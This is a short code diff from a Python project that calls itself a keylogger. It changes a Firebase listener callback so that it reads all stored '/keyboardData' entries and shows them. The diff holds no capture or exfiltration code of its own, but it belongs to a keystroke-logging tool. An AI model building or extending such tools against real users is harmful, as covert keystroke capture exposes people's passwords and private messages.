@@ -25,8 +25,11 @@ text = 'Welcome to keylogger'
 
 def callback(event):
     global text
-    if (event.data):
-        text = event.data
+    if event.data:
+        # Retrieve the entire data under /keyboardData
+        ref = db.reference('/keyboardData').get()
+        text = ref
+
 
 # Add listener to listen realtime updates
 ref = db.reference('/keyboardData')
